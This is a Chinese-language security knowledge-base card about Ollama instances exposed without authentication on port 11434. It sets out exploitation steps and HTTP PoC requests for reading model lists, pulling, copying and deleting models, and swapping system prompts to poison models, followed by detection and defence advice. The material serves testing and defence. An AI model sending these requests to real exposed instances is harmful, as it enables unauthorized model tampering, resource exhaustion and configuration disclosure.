---
id: web-generic-auth-ollama-unauth-api-model-management
title: Ollama 暴露 0.0.0.0:11434：无认证 API 导致模型管理、推理滥用与配置泄露
type: scenario
domain: web
path: web/generic/auth
technique: ollama-unauth-api-exposure
tags:
- ollama
- ai-infrastructure
- unauthenticated
- missing-auth
- model-management
- inference-service
- information-disclosure
- cors
- resource-abuse
- attack-surface
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V104
  verified_at: '2026-11-05T22:24:54+08:00'
  notes: 已对照原文与9张内嵌图核对：OLLAMA_HOST=0.0.0.0 下 / /api/version /api/tags 返回 200、无 401/403，api/pull 实测拉取 1.3GB 模型，api/copy/delete 无模型时返回 model not found 说明请求到达业务层，docker logs 泄露 OLLAMA_HOST/ORIGINS/MODELS/REMOTES，均与原文及截图一致。未验证点：模型替换（copy→create 改 System Prompt→delete）与 generate/chat/embed 推理滥用为 API 能力推演，原文未端到端实测（api/generate 截图因 llama-server 缺失报错）；frontmatter 无 sources/source_url；PoC 未本机复跑。
url: /docs/web/generic/auth/web-generic-auth-ollama-unauth-api-model-management/
draft: false
kb_aliases:
- Ollama 未授权 API
- Ollama 11434 暴露
- OLLAMA_HOST 0.0.0.0
- Ollama 模型管理未授权
- Ollama api/pull 滥用
- AI 推理服务裸奔
- Ollama attack surface
---

## 一句话结论

Ollama 默认只监听 127.0.0.1，但为了远程访问把 `OLLAMA_HOST` 改为 `0.0.0.0` 后，14 个 HTTP API 端点全部无认证对外开放：攻击者可匿名读取版本、模型列表、运行状态和启动配置，调用 pull/copy/delete/create 管理模型，并使用 generate/chat/embed 消耗推理资源；若实例上有模型，还可通过 api/copy + api/create 修改 System Prompt、删除原模型，实施模型替换或供应链投毒。

## 原理

- Ollama 的 HTTP API 基于 Gin，路由层没有挂载任何认证中间件；监听地址由 `OLLAMA_HOST` 控制，默认 127.0.0.1，改成 0.0.0.0 后不额外提示暴露风险。
- 14 个端点覆盖三类能力：信息与配置（`/`、`/api/version`、`/api/tags`、`/api/ps`、`/api/show`）、模型生命周期（`/api/pull`、`/api/push`、`/api/copy`、`/api/delete`、`/api/create`、`/api/blobs/`）、推理（`/api/generate`、`/api/chat`、`/api/embed`）。未认证请求返回 200/404/405，而不是 401/403，说明请求已进入业务层。
- 信息泄露：`/api/version` 提供版本号用于匹配历史 CVE；`/api/tags` 列出模型及大小/digest；`/api/ps` 暴露运行中模型、上下文长度、过期时间；`/api/show` 可返回模型详情与 blob 路径；启动日志（`docker logs`）还会打印 `OLLAMA_HOST`、`OLLAMA_ORIGINS`、`OLLAMA_MODELS`、`OLLAMA_REMOTES`，泄露模型存储路径与 CORS 策略。
- 模型生命周期滥用：`/api/pull` 可从 registry 拉取任意模型（原文实测 1.3GB 模型约 40 秒完成，pull 不受 `OLLAMA_NUM_PARALLEL` 限制，可分批占满磁盘）；`/api/copy` 可复制模型为近似名称；`/api/create` 可用 Modelfile 修改 System Prompt；`/api/delete` 可删除模型。攻击者可复制官方模型、篡改 System Prompt、删除原模型，诱导管理员或流水线使用被篡改模型。
- 推理滥用：`/api/generate`、`/api/chat`、`/api/embed` 可被匿名调用，消耗 GPU/CPU、占用并发、产生费用；也可用于探测模型能力与版本。
- 根因不是单个代码漏洞，而是“无认证 + 绑定 0.0.0.0”的部署组合；框架默认值安全（127.0.0.1），但 AI 工程师为了远程调试改成 0.0.0.0 后往往忘记改回，Shodan/ZoomEye 等测绘可直接发现。

## 触发条件

- 目标 Ollama 监听在公网可达地址（如 `0.0.0.0:11434` 或端口映射到公网），且前面没有带认证的反向代理/防火墙。
- 版本为无认证设计的 Ollama（原文实测 v0.31.1；历史版本同样默认无认证，具体版本需核对）。
- 攻击者可访问 11434 端口；不需要任何凭据。
- 若要进行模型替换，目标实例上已有模型，或攻击者可先 pull 一个模型。

## 利用步骤

1. 探测 11434：`GET /` 返回 `Ollama is running`，`GET /api/version` 获取版本，`GET /api/tags` 获取模型列表，`GET /api/ps` 获取运行中模型。
2. 读取启动配置：在能访问宿主机/容器日志的位置执行 `docker logs <container>` 或 `journalctl -u ollama`，提取 `OLLAMA_HOST`、`OLLAMA_ORIGINS`、`OLLAMA_MODELS`、`OLLAMA_REMOTES`。
3. 匿名拉取模型：`POST /api/pull {"model":"<model>","stream":false}`，观察磁盘占用；仅在授权环境验证，避免真实资源耗尽。
4. 模型替换（若已有模型）：`POST /api/copy` 复制为近似名称；`POST /api/create` 用 Modelfile 修改 System Prompt/参数；`DELETE /api/delete` 删除原模型；诱导管理员或自动化流程使用被篡改模型。
5. 推理验证：`POST /api/generate` 或 `/api/chat` 调用模型，确认匿名可用；记录响应时间与资源消耗。
6. 授权测试只使用自有靶机与无害提示词，不拉取超大模型、不删除生产模型；记录版本、端点状态码与配置泄露内容作为证据。

## PoC

```http
GET /api/version HTTP/1.1
Host: target:11434
```

```http
GET /api/tags HTTP/1.1
Host: target:11434
```

```http
POST /api/pull HTTP/1.1
Host: target:11434
Content-Type: application/json

{"model":"llama3.2:1b","stream":false}
```

```http
POST /api/copy HTTP/1.1
Host: target:11434
Content-Type: application/json

{"source":"llama3.2:1b","destination":"llama3.2-1b"}
```

```http
POST /api/create HTTP/1.1
Host: target:11434
Content-Type: application/json

{"model":"llama3.2-1b","modelfile":"FROM llama3.2:1b\nSYSTEM \"<modified system prompt>\""}
```

```http
DELETE /api/delete HTTP/1.1
Host: target:11434
Content-Type: application/json

{"model":"llama3.2:1b"}
```

以上请求均无需 Authorization；原文实测 `GET /api/version`、`/api/tags` 返回 200，`POST /api/pull` 成功拉取 1.3GB 模型，`api/copy`/`api/delete` 在无模型时返回 `model not found`（说明请求已到达业务层）。

## 变体与关联

- 变体：端口映射到公网但只改 Docker `-p 0.0.0.0:11434:11434`，Ollama 进程本身仍监听容器内 0.0.0.0；或通过 Nginx 反代但忘记 allow/deny/认证，外网仍可直达 API。
- 变体：模型替换可改成“复制为近似官方名称 + 修改 System Prompt + 删除原模型”，或通过 `api/create` 注入恶意 system prompt/模板；若上游 registry 被攻破，`api/pull` 不校验来源/完整性也会引入恶意模型。
- 变体：推理端点可被用于模型滥用、成本消耗、生成内容投放；`/api/embed` 可被用于批量文本处理。
- 关联卡片：[[web-generic-cors-ollama-desktop-origin-wildcard-csrf]]（同一 Ollama 的 CORS/CSRF 入口）、[[ai-security-gateway-security-litellm-custom-guardrail-http-primitive-ssrf]]（AI 服务扩展点风险）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（模型供应链投毒）。
- 关联：vLLM/TGI 默认监听 0.0.0.0，但提供可选 API Key；llama.cpp 无认证。AI 推理服务暴露面是行业共性问题。

## 检测与防御

- 防御：把 Ollama 绑定到 127.0.0.1（`-p 127.0.0.1:11434:11434` 或 `OLLAMA_HOST=127.0.0.1:11434`）；确需远程访问时，前面加带认证、IP 白名单、TLS 和速率限制的反向代理。
- 防御：防火墙只允许可信网段访问 11434；不要把 11434 直接映射到公网；用 Shodan/ZoomEye 自查暴露面。
- 防御：为模型管理接口增加认证/授权与审计；限制 `api/pull` 的模型来源、并发与磁盘配额；对 `api/copy`/`api/delete`/`api/create` 做高风险操作审批。
- 防御：模型发布使用签名/哈希校验，固定 revision；不要把模型管理 API 暴露给不可信网络。
- 检测：外网出现 11434 端口开放；未认证的 `/api/pull`/`/api/copy`/`/api/delete`/`/api/create` 请求；模型列表/digest 突变；磁盘异常增长；匿名 `/api/generate`/`/api/chat` 调用量异常。
- 响应：立即改为本地绑定/加认证，封禁来源 IP，审计模型是否被复制/删除/篡改，清理异常拉取的模型，轮换可能泄露的 registry 凭据。
